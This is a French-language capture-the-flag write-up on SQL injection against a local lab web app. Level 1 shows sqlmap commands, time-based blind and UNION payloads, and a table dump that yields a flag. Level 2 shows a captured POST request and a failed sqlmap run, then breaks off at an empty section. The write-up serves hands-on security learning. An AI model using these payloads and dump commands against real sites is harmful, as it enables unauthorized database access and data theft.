# SQLI

## Level 1

On remarque le paramètre `category`

```md
http://192.168.56.10/sqli/level_1/?category=Jouets
```

On utilise sqlmap pour voir si une injection est possible sur ce paramètre :

```bash
sqlmap -u 192.168.56.10/sqli/level_1/?category=Jouet -p category
```

On a une réponse positive

```bash
sqlmap identified the following injection point(s) with a total of 60 HTTP(s) requests:
---
Parameter: category (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: category=Jouet' AND (SELECT 3888 FROM (SELECT(SLEEP(5)))QvDj) AND 'JmoD'='JmoD

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: category=Jouet' UNION ALL SELECT NULL,NULL,CONCAT(0x7171627171,0x71695a637a78756b6e56674679597145736548736a7642536d42576e744d4a506458547a47566966,0x717a626b71),NULL,NULL-- -
---
```

On liste les tables possibles avec `--tables`, on trouve la table `flag` de la db `sqli_union_db`

On dump alors le contenu de la table avec la commande adéquate

```bash
sqlmap -u 192.168.56.10/sqli/level_1/?category=Jouet -p category -T flag --dump
```

On trouve le flag suivant
```bash
Database: sqli_union_db
Table: flag
[1 entry]
+------------------+
| content          |
+------------------+
| flag{F1rsT_SQLi} |
+------------------+
```

## Level 2

En explorant un peu la page on remarque dans le code HTML qu'une fonction `getnews()` est appelée avec un paramètre mystérieux pour chaque catégorie.
On trouve celle-ci définie dans le header de la page HTML
```js
function getnews(id){
    var xhr = new XMLHttpRequest();
    xhr.open("POST", 'news.php', true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function() {
        if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
            if(xhr.responseText){
                var element = document.getElementById(id);
                element.textContent = xhr.responseText
            }
            else{
                element.textContent = "No content";
            }
        }
    }
    xhr.send("news="+id);
};
```
On remarque que celle-ci envoie une requête POST à `/news.php` avec le paramètre `?news={id}`

On utilise Burpsuite pour formuler une requête POST et voir si on a un résultat avec un id existant \(par exemple le premier dans la liste `MTAwMDAw`\)
On peut également juste activer l'interception sur Burpsuite et capturer la requête lorsque on clique sur une catégorie.

On obtient une requête de la forme suivante

```http
POST /sqli/level_2/news.php HTTP/1.1
Host: 192.168.56.10
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: http://192.168.56.10
Connection: close
Referer: http://192.168.56.10/sqli/level_2/
Cookie: PHPSESSID=oonahFiesh5Aekoefieshi3mae0oqu3i

news=MTAwMDAw
```

### sqlmap

On test si sqlmap trouve que c'est injectable
```bash
sqlmap -r post_request.req -p news
```
post_request.req
```
POST /sqli/level_2/news.php?news=* HTTP/1.1
Host: 192.168.56.10
Cookie: PHPSESSID=oonahFiesh5Aekoefieshi3mae0oqu3i
```

sqlmap ne trouve pas d'injection

### burpsuite